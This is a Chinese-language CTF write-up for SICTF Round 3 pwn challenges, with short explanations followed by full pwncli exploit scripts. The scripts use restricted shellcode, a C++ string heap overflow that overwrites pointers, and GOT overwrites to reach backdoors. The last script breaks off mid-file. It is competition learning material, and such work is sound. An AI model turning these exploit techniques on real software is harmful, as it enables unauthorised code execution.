<h2 id="Bug-Zapper-Pro">Bug_Zapper_Pro+</h2>
<p>这题在Bug_Zapper的条件下 加上了仅可见字符的限制，使得要构造syscall之类的shellcode难度加大，需要用一些运算手法来处理，ADD,SUB,XOR等。</p>
<p>最大输入长度为0x10，是sys_ptrace在没有gdb attach的情况下返回是0，所以远程最大输入长度为0x10。</p>
<p>本地为了调试需要patch一下，直接把跳转条件给改了。</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%203.png" alt="Untitled"></p>
<p>调试的过程中发现仅有xor [rsp], edi这样子的内存修改是合法的，而且由于长度限制，最后改syscall不能push一字节，最后xor一次性改2bytes以上才能有效节省长度，所以用上了在可执行段自带的rax，</p>
<p>里面的0x114514FE0，这里中间的0x51和0x4F可以通过xor来获得0xf和0x5。</p>
<p>所以payload写成这样，感觉搓得非常极限，最后可以读入之后就随便写shellcode了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pad = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor [rsp], ah</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    xor [rsi+0x41-0x3], esi</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push 0x50</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>                                                                   </span><br><span class="line">shellcode = asm(pad)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sa(<span class="string">&quot;Feedback &gt;&gt;&gt; &quot;</span>, shellcode + <span class="string">b&#x27;\x3f\x40\x54&#x27;</span>) <span class="comment"># junk code + syscall</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># Use pwncli</span></span><br><span class="line"><span class="comment"># Date: 2024-02-17 11:53:25</span></span><br><span class="line"><span class="comment"># Editor: hkbin</span></span><br><span class="line"><span class="comment"># Usage:</span></span><br><span class="line"><span class="comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc -b \$rebase\(0x3000\)</span></span><br><span class="line"><span class="comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">cli_script()</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">file_path = <span class="string">&quot;/home/hkbin/Workspace/competition/SICTF_ROUND3/pwn/Bug_Zapper_revenge/pwn&quot;</span></span><br><span class="line"></span><br><span class="line">io: tube = gift.io</span><br><span class="line">elf: ELF = gift.elf</span><br><span class="line">libc: ELF = gift.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i, prompt</span>):</span><br><span class="line">    sla(prompt, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span></span><br><span class="line"><span class="comment"># one_gadgets: one_gadget_binary(binary_path, more)</span></span><br><span class="line"><span class="comment"># CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)</span></span><br><span class="line"><span class="comment"># Shellcode：ShellcodeMall.amd64</span></span><br><span class="line"><span class="comment"># tcache safelinking: protect_ptr(address, next)</span></span><br><span class="line"><span class="comment"># tcache safelinking_de: reveal_ptr(data)</span></span><br><span class="line"><span class="comment"># recvlibc: recv_current_libc_addr(offset(int), timeout(int))</span></span><br><span class="line"><span class="comment"># set_libcbase: set_current_libc_base_and_log(addr(int), offset(str or int))</span></span><br><span class="line"><span class="comment"># set_elfbase: set_current_code_base_and_log(addr, offset)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># burp:</span></span><br><span class="line"><span class="comment"># for i in range(0x10):</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         new_func()</span></span><br><span class="line"><span class="comment">#     except (EOFError):</span></span><br><span class="line"><span class="comment">#         gift.io = copy_current_io()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     push rax</span></span><br><span class="line"><span class="comment">#     pop rsi</span></span><br><span class="line"><span class="comment">#     push 0x3c595941</span></span><br><span class="line"><span class="comment">#     pop rdi</span></span><br><span class="line"><span class="comment">#     sub [rsi], edi</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># pad = &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     push 0x55</span></span><br><span class="line"><span class="comment">#     pop rbp</span></span><br><span class="line"><span class="comment">#     push rax</span></span><br><span class="line"><span class="comment">#     xor [rsp], ebp</span></span><br><span class="line"><span class="comment">#     pop rsi</span></span><br><span class="line"><span class="comment">#     xor [rsi+0x3b-0x3], esi</span></span><br><span class="line"><span class="comment">#     push rbx</span></span><br><span class="line"><span class="comment">#     pop rax</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause() # 0x10 bytes</span></span><br><span class="line">pad = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    xor [rsp], ah</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    xor [rsi+0x41-0x3], esi</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    push 0x50</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>                                                                   </span><br><span class="line">shellcode = asm(pad)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sa(<span class="string">&quot;Feedback &gt;&gt;&gt; &quot;</span>, shellcode + <span class="string">b&#x27;\x3f\x40\x54&#x27;</span>) <span class="comment"># junk code + syscall</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">s(flat([</span><br><span class="line">    ShellcodeMall.amd64.cat_flag.ljust(<span class="number">0x41</span>, <span class="string">b&#x27;\x00&#x27;</span>),</span><br><span class="line">    asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        mov rax, 0x114514faf</span></span><br><span class="line"><span class="string">        jmp rax</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">]))</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h2 id="Eeeeasy-Cpp">Eeeeasy_Cpp</h2>
<p>唉c++，ubuntu22.04跑报错缺c++库，需要在docker里面起个ubuntu23.04里面才能跑。</p>
<p>漏洞点在于cin输入，可以通过\x00截断后面得字符串长度判断，从而达到任意长度输入导致栈溢出。</p>
<p>这里是strings类型输入，所以会在堆里，溢出会覆盖后面的堆，输入一定长度会发现它挂了。</p>
<p>仔细看后面覆盖的内容，可以发现后面有两个指针可以被覆盖，一个是vtable的指针，也就是跳转G和P的函数，另一个居然是name输入的地址…(原来是用堆存储的)</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%204.png" alt="Untitled"></p>
<p>将后一个指针改为got表的内容之后通过P即可泄露libc，然后再G即可修改got表内容，最后还有个后门函数，就可以控制RIP了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># Use pwncli</span></span><br><span class="line"><span class="comment"># Date: 2024-02-16 18:04:14</span></span><br><span class="line"><span class="comment"># Editor: hkbin</span></span><br><span class="line"><span class="comment"># Usage:</span></span><br><span class="line"><span class="comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc -b \$rebase\(0x3000\)</span></span><br><span class="line"><span class="comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">cli_script()</span><br><span class="line">set_remote_libc(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">file_path = <span class="string">&quot;/home/hkbin/Workspace/competition/SICTF_ROUND3/pwn/ezcpp/pwn&quot;</span></span><br><span class="line"></span><br><span class="line">io: tube = gift.io</span><br><span class="line">elf: ELF = gift.elf</span><br><span class="line">libc: ELF = gift.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i, prompt</span>):</span><br><span class="line">    sla(prompt, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span></span><br><span class="line"><span class="comment"># one_gadgets: one_gadget_binary(binary_path, more)</span></span><br><span class="line"><span class="comment"># CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)</span></span><br><span class="line"><span class="comment"># Shellcode：ShellcodeMall.amd64</span></span><br><span class="line"><span class="comment"># tcache safelinking: protect_ptr(address, next)</span></span><br><span class="line"><span class="comment"># tcache safelinking_de: reveal_ptr(data)</span></span><br><span class="line"><span class="comment"># recvlibc: recv_current_libc_addr(offset(int), timeout(int))</span></span><br><span class="line"><span class="comment"># set_libcbase: set_current_libc_base_and_log(addr(int), offset(str or int))</span></span><br><span class="line"><span class="comment"># set_elfbase: set_current_code_base_and_log(addr, offset)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># burp:</span></span><br><span class="line"><span class="comment"># for i in range(0x10):</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         new_func()</span></span><br><span class="line"><span class="comment">#     except (EOFError):</span></span><br><span class="line"><span class="comment">#         gift.io = copy_current_io()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#sl(b&quot;a\x00&quot; + b&#x27;b&#x27;*0x20)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">ru(<span class="string">&quot;I&#x27;ll give you a gift: &quot;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(rl()[:-<span class="number">1</span>].decode(), <span class="number">16</span>) - <span class="number">0x2650</span></span><br><span class="line">log2_ex(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">backdoor = elf_base + <span class="number">0x22E0</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;G&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Enter your name: &quot;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Enter your password: &quot;</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x7</span> + <span class="string">b&#x27;\x00&#x27;</span> + p64(backdoor)*<span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;G&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Enter your name: &quot;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Enter your password: &quot;</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0xf</span> + <span class="string">b&#x27;\x00\x00&#x27;</span> + <span class="string">b&#x27;c&#x27;</span>*<span class="number">0xf</span> + p64(elf_base + <span class="number">0x4D48</span>) + p64(elf_base + <span class="number">0x5030</span>))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;P&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#leak_libc = recv_current_libc_addr()</span></span><br><span class="line"><span class="comment">#log2_ex(hex(leak_libc))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_base = leak_libc - (0x7f8ccc4a2fc0 - 0x7f8ccc31f000)</span></span><br><span class="line"><span class="comment">#log2_ex(hex(libc_base))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># got change</span></span><br><span class="line">sl(<span class="string">&quot;G&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Enter your name: &quot;</span>, p64(backdoor))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;Enter your password: &quot;</span>, <span class="string">b&#x27;11&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sla(&quot;Enter your password: &quot;, b&#x27;b&#x27;*0x10 + b&#x27;\x00&#x27; + b&#x27;c&#x27;*0xf + p64(elf_base + 0x4D48) + p64(libc_base + libc.sym[&#x27;__environ&#x27;]))</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h2 id="overflow">overflow</h2>
<p>又是cin和string，开了canary，有后门</p>
<p>输入个0x100长度的a，发现它挂了。</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%205.png" alt="Untitled"></p>
<p>将rdi控制为bss区，然后就不会卡住了</p>
<p>但是在栈里发现：</p>
<p><img src="/2024/02/19/SICTF-ROUND3-wp/Untitled%206.png" alt="Untitled"></p>
<p>往我们的地方写入了，估计是覆盖了strings的指针导致任意写入了。</p>
<p>然后将这个指针改为__stack_chk_fail函数的got表，往里输入backdoor地址即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3                                                                                                                                                                                                        </span></span><br><span class="line"><span class="comment"># Use pwncli                                                                                                                                                                                                                  </span></span><br><span class="line"><span class="comment"># Date: 2024-02-17 11:50:23                                                                                                                                                                                                   </span></span><br><span class="line"><span class="comment"># Editor: hkbin                                                                                                                                                                                                               </span></span><br><span class="line"><span class="comment"># Usage:                                                                                                                                                                                                                      </span></span><br><span class="line"><span class="comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc -b \$rebase\(0x3000\)                                                                                                                                           </span></span><br><span class="line"><span class="comment">#     Remote: python3 exp.py remote elf-file-path ip:port                                                                                                                                                                     </span></span><br><span class="line">                                                                                                                                                                                                                              </span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *                                                                                                                                                                                                          </span><br><span class="line">cli_script()                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                              </span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span>                                                                                                                                                                                                          </span><br><span class="line">file_path = <span class="string">&quot;/home/hkbin/Workspace/competition/SICTF_ROUND3/pwn/overflow/pwn&quot;</span>                                                                                                                                                 </span><br><span class="line"></span><br><span class="line">io: tube = gift.io</span><br><span class="line">elf: ELF = gift.elf</span><br><span class="line">libc: ELF = gift.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i, prompt</span>):</span><br><span class="line">    sla(prompt, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span></span><br><span class="line"><span class="comment"># one_gadgets: one_gadget_binary(binary_path, more)</span></span><br><span class="line"><span class="comment"># CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)</span></span><br><span class="line"><span class="comment"># Shellcode__ShellcodeMall.amd64</span></span><br><span class="line"><span class="comment"># tcache safelinking: protect_ptr(address, next)</span></span><br><span class="line"><span class="comment"># tcache safelinking_de: reveal_ptr(data)</span></span><br><span class="line"><span class="comment"># recvlibc: recv_current_libc_addr(offset(int), timeout(int))</span></span><br><span class="line"><span class="comment"># set_libcbase: set_current_libc_base_and_log(addr(int), offset(str or int))</span></span><br><span class="line"><span class="comment"># set_elfbase: set_current_code_base_and_log(addr, offset)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># burp:</span></span><br><span class="line"><span class="comment"># for i in range(0x10):</span></span><br><span class="line"><span class="comment">#     try:</span></span><br><span class="line"><span class="comment">#         new_func()</span></span><br><span class="line"><span class="comment">#     except (EOFError):</span></span><br><span class="line"><span class="comment">#         gift.io = copy_current_io()</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">sl(flat([</span><br><span class="line">    p64(<span class="number">0x4011D0</span>)*<span class="number">2</span>,</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>,</span><br><span class="line">    p64(<span class="number">0x404018</span>) * <span class="number">8</span></span><br><span class="line">    ]))</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h2 id="Bug-Zapper">Bug_Zapper</h2>
<p>shellcode题了，最多输入0x10的shellcode，控制shellcode再读一次sys_read即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># Use pwncli</span></span><br><span class="line"><span class="comment"># Date: 2024-02-16 14:36:19</span></span><br><span class="line"><span class="comment"># Editor: hkbin</span></span><br><span class="line"><span class="comment"># Usage:</span></span><br><span class="line"><span class="comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc -b \$rebase\(0x3000\)</span></span><br><span class="line"><span class="comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">cli_script()</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">file_path = <span class="string">&quot;/home/hkbin/Workspace/competition/SICTF_ROUND3/pwn/Bug_Zapper/pwn&quot;</span></span><br><span class="line"></span><br><span class="line">io: tube = gift.io</span><br><span class="line">elf: ELF = gift.elf</span><br><span class="line">libc: ELF = gift.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i, prompt</span>):</span><br><span class="line">    sla(prompt, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>():</span><br><span class="line">    cmd(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    <span class="comment">#......</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span></span><br><span class="line"><span class="comment"># one_gadgets: one_gadget_binary(binary_path, more)</span></span><br><span class="line"><span class="comment"># CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)</span></span><br><span class="line"><span class="comment"># Shellcode：ShellcodeMall.amd64</span></span><br><span class="line"><span class="comment"># tcache safelinking: protect_ptr(address, next)</span></span><br><span class="line"><span class="comment"># tcache safelinking_de: reveal_ptr(data)</span></span><br><span class="line"><span class="comment"># recvlibc: recv_current_libc_addr(offset(int), timeout(int))</span></span><br><span class="line"><span class="comment"># set_libcbase: set_current_libc_base_and_log(addr(int), offset(str or int))</span></span><br><span class="line"><span class="comment"># 